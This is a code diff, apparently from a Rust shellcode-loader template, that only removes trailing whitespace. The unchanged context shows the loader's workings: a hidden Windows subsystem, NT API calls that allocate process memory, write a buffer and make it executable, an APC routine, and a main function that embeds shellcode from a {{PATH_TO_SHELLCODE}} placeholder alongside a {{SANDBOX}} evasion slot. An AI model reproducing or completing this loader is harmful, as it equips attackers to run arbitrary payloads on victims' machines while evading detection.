@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"] 
+#![windows_subsystem = "windows"]
 #![allow(non_snake_case)]
 
 use winapi::{
@@ -14,7 +14,7 @@ use ntapi::ntpsapi::PPS_APC_ROUTINE;
 use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
 use std::{ptr::null_mut};
 use ntapi::ntpsapi::NtCurrentProcess;
-use ntapi::ntpsapi::NtCurrentThread; 
+use ntapi::ntpsapi::NtCurrentThread;
 use ntapi::ntmmapi::NtAllocateVirtualMemory;
 use ntapi::ntmmapi::NtWriteVirtualMemory;
 use ntapi::ntmmapi::NtProtectVirtualMemory;
@@ -38,7 +38,7 @@ fn enhance(mut buf: Vec<u8>) {
         if !NT_SUCCESS(alloc_status) {
             panic!("Error allocating memory to the local process: {}", alloc_status);
         }
-        
+
         let mut byteswritten = 0;
         let buffer = buf.as_mut_ptr() as *mut c_void;
         let mut buffer_length = buf.len();
@@ -65,7 +65,7 @@ fn enhance(mut buf: Vec<u8>) {
 
 fn main() {
     {{SANDBOX}}
-    
+
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
     // Removing the sandobox check for now, as it fails on numerous Windows versions.
     /*
